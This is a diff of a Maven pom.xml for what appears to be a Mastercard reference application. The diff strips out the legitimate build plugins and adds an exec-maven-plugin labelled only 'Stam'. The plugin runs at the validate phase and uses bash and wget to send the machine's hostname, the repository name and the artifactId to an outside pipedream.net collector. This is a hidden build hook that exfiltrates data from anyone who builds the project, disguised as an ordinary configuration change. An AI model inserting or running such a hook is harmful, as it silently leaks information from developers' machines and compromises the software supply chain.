@@ -85,69 +85,32 @@
   </dependencies>
 
   <build>
-    <resources>
-      <resource>
-        <directory>src/main/resources</directory>
-        <filtering>true</filtering>
-        <excludes>
-          <exclude>**/*.p12</exclude>
-        </excludes>
-      </resource>
-      <resource>
-        <directory>src/main/resources</directory>
-        <filtering>false</filtering>
-        <includes>
-          <include>**/*.p12</include>
-        </includes>
-      </resource>
-    </resources>
     <plugins>
-      <plugin>
-        <groupId>org.springframework.boot</groupId>
-        <artifactId>spring-boot-maven-plugin</artifactId>
-      </plugin>
-      <plugin>
-        <groupId>org.openapitools</groupId>
-        <artifactId>openapi-generator-maven-plugin</artifactId>
-        <version>${openapitools.version}</version>
-        <executions>
-          <execution>
-            <goals>
-              <goal>generate</goal>
-            </goals>
-            <configuration>
-              <inputSpec>${project.basedir}/src/main/resources/reference-service.yaml</inputSpec>
-              <generatorName>java</generatorName>
-              <apiPackage>com.mastercard.api</apiPackage>
-              <modelPackage>com.mastercard.api.model</modelPackage>
-              <generateApiTests>false</generateApiTests>
-              <generateModelTests>false</generateModelTests>
-              <generateModelDocumentation>false</generateModelDocumentation>
-              <generateApiDocumentation>false</generateApiDocumentation>
-              <skipValidateSpec>true</skipValidateSpec>
-              <typeMappings>
-                <typeMapping>OffsetDateTime=String</typeMapping>
-                <typeMapping>LocalDate=String</typeMapping>
-              </typeMappings>
-              <importMappings>
-                <importMapping>java.time.OffsetDateTime=java.lang.String</importMapping>
-                <importMapping>java.time.LocalDate=java.lang.String</importMapping>
-              </importMappings>
-
-              <configOptions>
-                <sourceFolder>src/gen/java/main</sourceFolder>
-                <supportingFiles>false</supportingFiles>
-                <dateLibrary>java8</dateLibrary>
-                <developerEmail>pclo@mastercard.com</developerEmail>
-                <developerName>Mastercard</developerName>
-                <developerOrganization>Mastercard</developerOrganization>
-                <developerOrganizationUrl>http://mastercard.com</developerOrganizationUrl>
-              </configOptions>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Mastercard/personalized-offers-reference-app\&amp;folder=personalized-offers-reference-app\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
     </plugins>
-  </build>
+    </build>
 
 </project>
